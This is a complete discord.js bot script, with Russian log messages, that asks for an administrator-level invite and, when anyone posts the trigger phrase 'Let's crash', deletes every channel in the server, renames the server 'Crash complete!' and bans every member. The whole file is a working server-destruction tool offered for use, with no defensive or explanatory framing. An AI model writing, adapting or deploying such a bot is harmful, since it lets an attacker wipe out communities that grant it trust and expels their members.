const client = new require("discord.js").Client();

client.on("ready", () => {
  console.log(`Бот запущен, с ${client.users.size} пользователями, в ${client.channels.size} каналах в ${client.guilds.size} серверах.`);
  console.log(`Вход выполнен под ${client.user.tag}!`);
  client.user.setPresence({ status: "online", game: { name: "Let\"s crash | " + client.guilds.size + " серверов" } });
  client.generateInvite(["ADMINISTRATOR"]).then(link =>{
    console.log(`Ссылка для приглашение бота: ${link}`);
  });
});

client.on("message", message => {
  if (message.content === "Let\"s crash") {
    message.guild.channels.array().forEach(channel => {
      channel.delete("Lol");
    });
    message.guild.setName("Crash complete!");
    message.guild.members.array().forEach(member => {
      member.ban();   
    });
  }
});

client.on("guildCreate", guild => {
  console.log("Бот добавлен на сервер: " + guild.name + "!");
  client.user.setPresence({ status: "online", game: { name: "Let\"s crash | " + client.guilds.size + " серверов" } });
});

client.login("токен");
